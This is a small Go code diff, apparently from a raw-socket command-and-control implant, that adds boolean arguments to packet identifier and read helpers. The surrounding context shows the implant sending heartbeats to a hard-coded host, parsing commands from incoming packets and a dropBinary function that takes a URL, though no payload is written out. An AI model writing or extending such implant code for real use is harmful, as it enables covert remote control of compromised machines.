@@ -44,7 +44,7 @@ func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.
 		// Create Cmd -> Encrypt -> Wrap with Identifier
 		data := cattails.CreateHello(iface.HardwareAddr, src)
 		// data = xorData(data)
-		data = rawsocket.AddIdentifier(data)
+		data = rawsocket.AddIdentifier(data, true)
 
 		// Send Packet
 		packet := cattails.CreatePacket(iface, src, dst, 18000, 58000, dstMAC, data)
@@ -66,7 +66,7 @@ func dropBinary(url string, procname string) {
 }
 
 func implantProcessPacket(packet gopacket.Packet, hostIP net.IP) {
-	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()))
+	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()), false)
 	data = strings.Trim(data, "\n")
 
 	// Split into list to get command and args
@@ -123,7 +123,7 @@ func main() {
 	go generateHeartbeat(iface, src, net.IPv4(192, 168, 1, 174), dstMAC)
 
 	for {
-		packet := rawsocket.BothReadPacket(readfd, vm)
+		packet := rawsocket.BothReadPacket(readfd, vm, false)
 		if packet != nil {
 			go implantProcessPacket(packet, src)
 		}
